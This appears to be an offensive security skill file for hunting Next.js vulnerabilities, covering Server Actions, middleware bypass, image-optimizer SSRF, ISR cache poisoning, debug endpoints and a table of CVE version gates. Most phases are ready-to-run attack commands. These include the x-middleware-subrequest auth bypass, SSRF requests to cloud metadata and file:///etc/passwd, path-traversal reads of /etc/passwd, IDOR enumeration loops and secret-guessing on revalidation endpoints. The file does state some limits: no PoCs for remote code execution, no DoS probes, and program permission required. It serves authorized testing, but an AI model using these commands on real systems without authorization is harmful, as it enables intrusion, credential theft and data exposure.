---
name: hunt-nextjs
description: Hunt Next.js specific vulnerabilities — React2Shell RSC Flight deserialization RCE (CVE-2025-55182), Server Actions arbitrary function execution, Middleware auth bypass via static asset paths, ISR cache poisoning, Image Optimization SSRF (/_next/image), RSC payload leakage, getServerSideProps injection, source map exposure, debug endpoint leakage, 2025-2026 security-release version gates. Use when target runs Next.js 13/14/15/16 or any React SSR framework.
metadata:
  sources: "cve_database (CVE-2024-34351 / GHSA-fr5h-rqp8-mj6g, CVE-2025-55182 / GHSA-9qr9-h5gf-34mp), Next.js advisories and security releases (Dec 2025, Aug 2026, Sep 2026), GTIG + Datadog Security Labs React2Shell write-ups"
  report_count: 0
---

# HUNT-NEXTJS — Next.js / SSR Framework Vulnerabilities

## Crown Jewel Targets

Next.js-specific bugs that bypass auth or reach SSRF = High/Critical.

**Highest-value chains:**
- **React2Shell (CVE-2025-55182)** - unauthenticated RCE in the RSC Flight decoder on any App Router app running a vulnerable `react-server-dom-*`; version-gated, see Phase 2b
- **Server Actions auth bypass** — Server Actions enforce auth client-side only → call action ID directly → unauthorized data mutation or exfil
- **Middleware bypass via `/_next/static/`** — middleware skips static asset paths → protected routes accessible via `/_next/data/` IDOR
- **`/_next/image` SSRF** — Image optimizer fetches attacker-controlled URL → internal network scan or cloud metadata
- **ISR stale cache poisoning** — inject malicious content into a cached page that gets served to all users
- **RSC payload leakage** — React Server Component flight data contains server-side props not meant for client

---

## Attack Surface Signals

```
/_next/image?url=&w=&q=          Image optimizer — SSRF candidate
/_next/data/BUILD_ID/*.json      Prerendered page data — IDOR candidate
/__nextjs_original-stack-frame   Debug stack frame endpoint
/_next/static/chunks/            JS bundles — source map candidate
/api/                            API routes — standard hunt surface
__NEXT_DATA__ in HTML            SSR props leaked to client
x-nextjs-* response headers      Confirms Next.js
self.__next_f in HTML / RSC: 1   App Router (RSC Flight) - React2Shell surface
x-vercel-id response header      Vercel-hosted (many 2025-2026 CVEs are self-hosted only)
```

---

## Phase 1 — Fingerprint & Version Detection

```bash
# Confirm Next.js and get build ID
curl -s https://$TARGET/ | grep -oP '"buildId":"[^"]+"'
curl -sI https://$TARGET/ | grep -i "x-powered-by\|x-nextjs"

# Extract build ID for /_next/data/ paths
BUILD_ID=$(curl -s https://$TARGET/ | grep -oP '"buildId":"\K[^"]+')
echo "Build ID: $BUILD_ID"

# Check Next.js version via package disclosure
curl -s https://$TARGET/_next/static/chunks/framework*.js | grep -oP '"next":"[^"]+"'

# Runtime version: in the browser console `next.version` (window.next is set by the client runtime)
# App Router vs Pages Router (drives React2Shell and several 2026 gates)
curl -s https://$TARGET/ | grep -c 'self.__next_f'      # >0 = App Router (RSC Flight inlined)
curl -sI https://$TARGET/ -H "RSC: 1" | grep -i "content-type"   # text/x-component = App Router

# Source map exposure
curl -s "https://$TARGET/_next/static/chunks/pages/index.js.map" | head -5
curl -s "https://$TARGET/_next/static/chunks/main.js.map" | head -5
```

---

## Phase 2 — Server Actions Abuse

```bash
# Server Actions in Next.js 14+ use x-action-id or Next-Action header
# Find action IDs in HTML source or JS bundles
curl -s https://$TARGET/ | grep -oP '"action":"[a-f0-9]+"'
grep -r "createActionURL\|$$ACTION_" recon/$TARGET/ --include="*.js" 2>/dev/null

# Call Server Action directly without auth
curl -s -X POST https://$TARGET/target-page \
  -H "Next-Action: ACTION_ID_HERE" \
  -H "Content-Type: multipart/form-data; boundary=----" \
  -H "Cookie: " \
  --data-raw $'------\r\nContent-Disposition: form-data; name="1"\r\n\r\n[]\r\n------\r\n'

# Test: does the action execute without a valid session?
# If it returns data or mutates state → auth enforcement is client-side only
```

---

## Phase 2b - React2Shell: RSC Flight Deserialization RCE (CVE-2025-55182)

Pre-auth RCE: `react-server-dom-webpack` / `-turbopack` / `-parcel` unsafely deserialize the
body of HTTP requests to **Server Function endpoints**. Disclosed 2025-12-03, CVSS 10.0, in CISA
KEV since 2025-12-05; GTIG saw espionage clusters and cryptominers exploiting it within days.
Next.js first tracked it as CVE-2025-66478, which is now **REJECTED as a duplicate** of
CVE-2025-55182: cite 55182 in reports.

**Precondition is the App Router, not a Server Action you found.** Datadog reproduced it on a
blank `create-next-app`, so do not gate on harvesting an action ID. Pages Router-only apps are not
affected. Other RSC frameworks are affected through the same packages: gate on the
`react-server-dom-*` version in the lockfile when you have source.

| Component | Vulnerable | Fixed (RCE) |
|---|---|---|
| `react-server-dom-*` | 19.0.0, 19.1.0, 19.1.1, 19.2.0 | 19.0.1 / 19.1.2 / 19.2.1 |
| `next` (App Router) | 15.x, 16.x, and canaries >= 14.3.0-canary.77 | 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 |

**Follow-on RSC CVEs (not RCE, same endpoints):** CVE-2025-55183 (Server Function source code
exposure, CVSS 5.3; leaks secrets hardcoded in action source) and CVE-2025-55184 (pre-auth DoS,
CVSS 7.5, first fix incomplete, completed as CVE-2025-67779). Next.js fixed all three in 14.2.35 /
15.0.7 / 15.1.11 / 15.2.8 / 15.3.8 / 15.4.10 / 15.5.9 / 16.0.10. React then shipped more DoS fixes
(CVE-2026-23864); React says 19.0.3 / 19.1.4 / 19.2.3 are incomplete and 19.0.4 / 19.1.5 / 19.2.4
are safe. DoS issues are version-gate only: never send a DoS probe.

```bash
# 1) App Router present? (Phase 1: self.__next_f in HTML, RSC: 1 -> text/x-component)
# 2) Version gate: next.version (browser console) or the version string in a client chunk;
#    with source access: npm ls next react-server-dom-webpack react-server-dom-turbopack
# 3) Endpoint evidence for the report: any App Router route that accepts POST with Next-Action
curl -s https://$TARGET/ | grep -oP '"action":"[a-f0-9]+"' | head -3   # optional, see Phase 2
```

**Verification:** version gate + App Router fingerprint is the finding. Do NOT fire public
React2Shell PoCs: GTIG reports many are non-functional or malicious (some target researchers), and
Datadog advises against active probing of production. Any active confirmation needs Stage B
sign-off and explicit program permission, and must be a vetted non-executing check. Severity:
Critical. Sources: GHSA-9qr9-h5gf-34mp, nextjs.org/blog/security-update-2025-12-11,
react.dev/blog/2025/12/11, GTIG and Datadog Security Labs React2Shell write-ups.

---

## Phase 3 — Middleware Auth Bypass

```bash
# Next.js middleware runs on edge runtime and may skip certain paths
# Test protected route directly
curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard
# → 200 means accessible

# Test via /_next/data/ (SSG/ISR JSON) — middleware may not apply
curl -s "https://$TARGET/_next/data/$BUILD_ID/admin/dashboard.json"

# Test via static asset path prefix (middleware matcher may exclude /_next/static)
curl -s "https://$TARGET/_next/static/../admin/dashboard"

# Encoded path bypass
curl -s "https://$TARGET/%5Fnext/data/$BUILD_ID/admin/users.json"
curl -s "https://$TARGET/_next/data/$BUILD_ID/..%2Fadmin%2Fusers.json"
```

---

### Middleware bypass via `x-middleware-subrequest` (CVE-2025-29927)
Next skips middleware execution entirely when this header asserts an internal subrequest — bypassing auth/redirect middleware on gated routes.
```bash
curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
# also: -H "x-middleware-subrequest: src/middleware"  and  "pages/_middleware"
# 200 on a middleware-gated route = bypassed. Fixed 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3.
```

### Middleware SSRF via headers passed into `NextResponse.next()` (CVE-2025-57822)
Self-hosted only, CVSS 6.5. Affected < 14.2.32 and 15.x < 15.4.7; fixed 14.2.32 / 15.4.7
(GHSA-4342-x723-ch2f). When middleware passes the incoming request headers straight into
`NextResponse.next()` instead of `NextResponse.next({ request: { headers } })`, sensitive request
headers are reflected into the response and the server can be steered into an SSRF (the advisory
title points at redirect handling; exact trigger header: verify).
```bash
# Source review: the vulnerable shape
grep -rnE "NextResponse\.next\(\s*\{\s*headers" middleware.* src/middleware.* 2>/dev/null
# Black-box: version gate + self-hosted (no x-vercel-id); confirm only via a unique OOB callback
```

## Phase 4 — Image Optimization SSRF (`/_next/image`)

```bash
# Basic SSRF test — internal metadata
curl -s "https://$TARGET/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75"

# Protocol bypass attempts
curl -s "https://$TARGET/_next/image?url=file:///etc/passwd&w=64&q=75"
curl -s "https://$TARGET/_next/image?url=http://127.0.0.1:6379/&w=64&q=75"

# OOB detection — use a UNIQUE per-test subdomain so callbacks can't be confused
COLLAB="http://UNIQUE.COLLAB_HOST"
curl -s "https://$TARGET/_next/image?url=$COLLAB/nextjs-ssrf&w=64&q=75"
# Check Interactsh/Burp Collaborator for DNS/HTTP callback on that exact subdomain
```

**FALSE-POSITIVE GUARD (read before claiming SSRF):** `/_next/image` only
fetches remote URLs whose **hostname** matches `images.remotePatterns` /
`images.domains` in `next.config.js`. A non-whitelisted `url` returns **400 by
default** — that is the optimizer's normal allowlist rejection, NOT a "block" you
bypassed. A **200** returns an *optimized image*, not the upstream response body,
so a status code alone NEVER confirms SSRF. Confirm only via an **out-of-band
callback to a unique Collaborator subdomain** (above), or by body-diffing a
known-internal vs known-external target. Do not report on status code.

The allowlist is a hostname check, not an IP check. On 16.0.0 to < 16.3.8 the
optimizer follows attacker-controlled DNS for an allow-listed host, so a pattern
covering a host whose DNS you control (e.g. a wildcard over user-registrable
subdomains) reaches private IPs after passing the check (CVE-2026-94483, Phase 9).
Map which hosts return non-400 first, then ask who controls their DNS. Two other
SSRF paths skip the optimizer entirely: CVE-2026-44578 (WebSocket upgrade, Phase 9)
and CVE-2024-34351 (Server Actions, note below).

**Cache-key confusion (CVE-2025-57752, GHSA-g5qg-72qw-gw5v):** affected < 14.2.31
and 15.0.0 to < 15.4.5, fixed 14.2.31 / 15.4.5. When `/_next/image` optimizes an
image from the app's own API route that varies by `Cookie` / `Authorization`
(avatars, private attachments), the optimized response can be cached and served
to unauthorized users. Fetch `/_next/image?url=/api/<private-image>&w=64&q=75` as
user A, then the same URL from a clean unauthenticated client: identical bytes =
cross-user leak.

> Note: CVE-2024-34351 (Next.js SSRF, GHSA-fr5h-rqp8-mj6g, affects 13.4.0
> through < 14.1.1, fixed in 14.1.1) is a **Server Actions** SSRF — a relative
> redirect that trusts the `Host` header — NOT a `/_next/image` bug, and it does
> NOT affect Host-routed providers like Vercel. See Phase 2 for the Server
> Actions surface.

---

## Phase 5 — `/_next/data/` IDOR & Data Leakage

```bash
# Enumerate prerendered JSON for user-specific data
# Pattern: /_next/data/BUILD_ID/[page].json or /_next/data/BUILD_ID/[dynamic]/[id].json
curl -s "https://$TARGET/_next/data/$BUILD_ID/profile.json" \
  -H "Cookie: session=VICTIM_SESSION"

# Try other users' data
for ID in 1 2 3 100 1000; do
  curl -s "https://$TARGET/_next/data/$BUILD_ID/users/$ID.json" | head -3
done

# Check __NEXT_DATA__ in HTML for sensitive server-side props
curl -s "https://$TARGET/dashboard" | \
  python3 -c "import sys,re,json; m=re.search(r'<script id=\"__NEXT_DATA__\"[^>]*>(.*?)</script>',sys.stdin.read(),re.S); print(json.dumps(json.loads(m.group(1)),indent=2) if m else 'not found')"
```

---

## Phase 6 — ISR Cache Poisoning

**Version gate first.** Next.js 15.0.0 to < 15.5.27 and 16.0.0 to < 16.3.8 carry two
framework-level SSG/ISR cache-key bugs (fixed 15.5.27 / 16.3.8, Phase 9):
CVE-2026-94543 (self-hosted Pages Router SSG/ISR, one route's entry replaced by another's;
Vercel not affected) and CVE-2026-94484 (root-level catch-all page + SSG/ISR, one
unauthenticated request gives cross-user substitution or persistent DoS). On a patched
version, poisoning needs an app-level bug: user input rendered into an ISR page. Poison
only a path you control or a low-traffic page with program permission.

```bash
# ISR pages regenerate on request after revalidation period
# If user input influences the static page content without sanitization:
# 1. Trigger revalidation with malicious input in URL/query
# 2. Injected content cached and served to all users

# Test: does query param affect cached page content?
# Use a UNIQUE marker (not a generic <script>) so a match proves YOUR input landed,
# and confirm the response was actually CACHED + served to a DIFFERENT client.
MARK="zqx$(date +%s)"
# 1) Poison with the marker
curl -s "https://$TARGET/blog/test-post?preview=<b>$MARK</b>" -o /dev/null
# 2) Re-fetch the CLEAN url (no query) from a fresh client and grep the marker.
#    Body-diff clean-vs-poisoned and check x-nextjs-cache / age headers — a reflected
#    marker WITHOUT proof it persists in the cache key is just reflection, not poisoning.
curl -si "https://$TARGET/blog/test-post" | grep -iE "$MARK|x-nextjs-cache|age:"

# On-demand revalidation endpoint (if exposed)
curl -s "https://$TARGET/api/revalidate?secret=GUESS&path=/blog/test"
curl -s "https://$TARGET/api/revalidate?token=GUESS&path=/admin"
```

---

## Phase 7 — Debug & Stack Frame Endpoints

**Precondition:** `__nextjs_launch-editor` and `__nextjs_original-stack-frame`
are react-dev-overlay middleware mounted ONLY under `next dev`. A production
build (`next build && next start`) does not register these routes — a 404 here
is the normal, expected result, not a "filter" you need to bypass. They are
reachable ONLY in the rare misconfiguration of literally running `next dev` in
production. Treat any non-404 as the real finding; do NOT report a 404/filtered
response as confirmation. A `next dev` server on 16.0.0 to < 16.3.8 also exposes a
Model Context Protocol endpoint without a cross-origin check (CVE-2026-94486, Low;
leaks project path, source snippets, route inventory, dev logs). Production builds
do not serve it.

```bash
# First confirm dev mode is actually exposed (anything but 404 = dev server in prod)
curl -s -o /dev/null -w "%{http_code}" \
  "https://$TARGET/__nextjs_original-stack-frame?isServer=true&errorMessage=test"

# Only if the above is NOT 404: the launch-editor / stack-frame endpoints can
# reference local files (file-read surface of a dev server wrongly exposed)
curl -s "https://$TARGET/__nextjs_launch-editor?file=../../etc/passwd&line=1"
curl -s "https://$TARGET/__nextjs_original-stack-frame" \
  --data '{"file":"/etc/passwd","line":1,"column":1}'
```

---

## Phase 8 — Environment Variable Leakage

```bash
# NEXT_PUBLIC_* vars are baked into JS bundles — grep for secrets
curl -s "https://$TARGET/_next/static/chunks/pages/_app.js" | \
  grep -oE "NEXT_PUBLIC_[A-Z_]+['\"]?\s*[:=]\s*['\"]?[^'\"&\s]+"

# Check for non-public vars accidentally exposed
curl -s https://$TARGET/ | python3 -c "
import sys, re, json
m = re.search(r'__NEXT_DATA__.*?({.*?})</script>', sys.stdin.read(), re.S)
if m:
    d = json.loads(m.group(1))
    print(json.dumps(d.get('props', {}), indent=2))
"
```

---

## Phase 9 - 2026 Security Releases (Version Gates)

Gate on `next.version` (Phase 1) and hosting (`x-vercel-id`). Rows marked DoS are version-gate
only: never probe them. RCE rows: version gate is the finding; active tests need Stage B sign-off.

| ID | Bug | Affected | Fixed | Precondition |
|---|---|---|---|---|
| CVE-2026-44578 / GHSA-c4j6-fc7j-m34r | SSRF via crafted WebSocket upgrade requests (CVSS 8.6) | 13.4.13 to < 15.5.16; 16.0.0 to < 16.2.5 | 15.5.16 / 16.2.5 | Self-hosted built-in Node server; Vercel not affected |
| CVE-2026-64644 / GHSA-q8wf-6r8g-63ch | CPU-exhaustion DoS in `/_next/image` via malicious SVG | 15.5.0 to < 15.5.21; 16.0.0 to < 16.2.11 | 15.5.21 / 16.2.11 | Self-hosted default loader + `remotePatterns` (DoS) |
| GHSA-2xp9-vwfh-vxw4 (no CVE; libheif GHSA-g89c-p67h-r497) | Unauth RCE when the optimizer processes an attacker-controlled AVIF (sharp/libheif), Aug 2026, Critical | 10.0.0 to < 15.5.24; 16.x < 16.3.3 | 15.5.24 / 16.3.3 (AVIF optimization disabled) | Optimizer reachable with an image you control |
| CVE-2026-75604 / GHSA-p293-qw3h-jr36 | Unauth RCE on Windows hosts: encoded backslashes in route segments escape incremental-cache paths (CVSS 9.0) | 13.4.0 to < 15.5.24; 16.0.0 to < 16.3.3 | 15.5.24 / 16.3.3 | Windows-hosted; Pages Router, or App Router without Cache Components |
| CVE-2026-94483 / GHSA-cjq9-62q9-8jv4 | Image Optimization SSRF through an allow-listed `remotePatterns` host (Phase 4) | 16.0.0 to < 16.3.8 | 16.3.8 | `remotePatterns` configured |
| CVE-2026-94543 / GHSA-4jqv-mc3x-m676 | SSG/ISR cache poisoning across routes (Phase 6) | 15.0.0 to < 15.5.27; 16.0.0 to < 16.3.8 | 15.5.27 / 16.3.8 | Self-hosted Pages Router SSG/ISR |
| CVE-2026-94484 / GHSA-mcj8-r9mp-w47p | SSG/ISR cache poisoning: cross-user substitution / persistent DoS (Phase 6) | 15.0.0 to < 15.5.27; 16.0.0 to < 16.3.8 | 15.5.27 / 16.3.8 | Root-level catch-all page + SSG/ISR |
| CVE-2026-94485 / GHSA-f87g-xv8r-7p7x | `opengraph-image` / `twitter-image` routes ignore `dynamicParams`: render segments excluded from `generateStaticParams()` | 16.0.0 to < 16.3.8 | 16.3.8 | App Router built with webpack (Turbopack not affected) |
| CVE-2026-94486 / GHSA-39w2-rjm5-chcv | `next dev` MCP endpoint readable cross-origin (Phase 7) | 16.0.0 to < 16.3.8 | 16.3.8 | Only `next dev` |

Sources: nextjs.org/blog/august-2026-security-release, nextjs.org/blog/september-2026-security-release,
nextjs.org/blog/security-update-2025-12-11, the GHSAs above, and the cve.org records.

---

## Chain Table

| Next.js finding | Chain to | Impact |
|----------------|----------|--------|
| React2Shell-vulnerable `next` + App Router | Pre-auth RCE (version gate, Phase 2b) | Server compromise |
| Server Action no auth | Call privileged mutations directly | Data manipulation / admin access |
| `/_next/image` SSRF | Cloud metadata → IAM creds | Cloud compromise |
| `/_next/data/` IDOR | Other users' server-side props | PII / token exfil |
| Middleware bypass | Protected admin routes | Auth bypass |
| Source map exposed | Reconstruct TS source → find hardcoded secrets | Further vulns |
| `__NEXT_DATA__` leaks | Server-side secrets in HTML | API keys / tokens |

---

## Validation

✅ Server Action: action executes without valid session, returns data or mutates state
✅ SSRF: DNS/HTTP callback received from `/_next/image` SSRF
✅ Middleware bypass: 200 response on protected route without auth cookie
✅ Data leak: `__NEXT_DATA__` contains non-public secrets or other users' PII

**Severity:**
- React2Shell (CVE-2025-55182) on a vulnerable App Router build: Critical
- Server Action auth bypass → data mutation: High/Critical
- Image SSRF → cloud metadata: Critical
- Middleware bypass → admin panel: High
- Source map exposure only: Low-Medium
